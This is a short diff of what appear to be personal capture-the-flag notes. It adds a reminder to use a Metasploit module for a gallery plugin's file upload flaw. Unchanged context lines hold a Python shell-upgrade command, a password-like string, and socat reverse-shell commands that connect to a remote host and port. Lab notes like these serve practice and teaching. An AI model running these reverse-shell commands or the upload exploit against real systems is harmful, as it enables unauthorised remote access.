@@ -243,7 +243,12 @@ which python python2 python3
 python3 -c 'import pty;pty.spawn("/bin/bash")';
 GOT THE FLAG 
 
-Privilage escalatekali
+# method 2 (metasploit)
+reflex gallery file upload
+
+
+
+# Privilage escalatekali
 
 H@ckme@123
 
@@ -261,3 +266,7 @@ RPORT=12345
 socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
 
 sudo socat tcp-connect:10.2.56.209:9999 exec:bash,pty,stderr,setsid,sigint,sane
+
+
+
+
